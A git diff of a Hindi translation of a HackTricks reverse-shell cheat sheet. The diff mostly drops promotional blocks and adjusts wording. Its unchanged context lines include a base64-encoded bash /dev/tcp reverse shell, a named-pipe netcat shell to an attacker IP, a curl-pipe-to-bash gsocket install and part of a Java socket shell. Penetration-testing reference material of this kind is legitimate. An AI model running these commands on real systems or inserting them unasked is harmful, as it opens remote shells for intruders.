@@ -15,15 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-**यदि आपके पास इन शेल्स के बारे में कोई प्रश्न हैं, तो आप उन्हें** [**https://explainshell.com/**](https://explainshell.com) **पर देख सकते हैं।**
+**यदि आपके पास इन शेल के बारे में कोई प्रश्न हैं, तो आप उन्हें** [**https://explainshell.com/**](https://explainshell.com) **पर देख सकते हैं।**
 
 ## Full TTY
 
@@ -57,7 +49,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 
 1. **`bash -i`**: इस कमांड का यह भाग एक इंटरैक्टिव (`-i`) बैश शेल शुरू करता है।
 2. **`>&`**: इस कमांड का यह भाग **मानक आउटपुट** (`stdout`) और **मानक त्रुटि** (`stderr`) को **एक ही गंतव्य** पर पुनर्निर्देशित करने के लिए एक संक्षिप्त नोटेशन है।
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: यह एक विशेष फ़ाइल है जो **निर्दिष्ट IP पते और पोर्ट के लिए एक TCP कनेक्शन का प्रतिनिधित्व करती है**।
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: यह एक विशेष फ़ाइल है जो **निर्धारित IP पते और पोर्ट के लिए एक TCP कनेक्शन का प्रतिनिधित्व करती है**।
 * **आउटपुट और त्रुटि धाराओं को इस फ़ाइल पर पुनर्निर्देशित करके**, कमांड प्रभावी रूप से इंटरैक्टिव शेल सत्र का आउटपुट हमलावर की मशीन पर भेजता है।
 4. **`0>&1`**: इस कमांड का यह भाग **मानक इनपुट (`stdin`) को मानक आउटपुट (`stdout`) के समान गंतव्य पर पुनर्निर्देशित करता है**।
 
@@ -122,7 +114,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-इसे [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) पर चेक करें
+इसे [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) पर जांचें
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -340,12 +332,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-**ट्राई हार्ड सुरक्षा समूह**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
 AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
@@ -354,9 +340,9 @@ GCP हैकिंग सीखें और अभ्यास करें: <
 
 <summary>HackTricks का समर्थन करें</summary>
 
-* [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जांच करें!
-* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो करें** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।
+* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
+* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रिपोजिटरी में PR सबमिट करें।
 
 </details>
 {% endhint %}
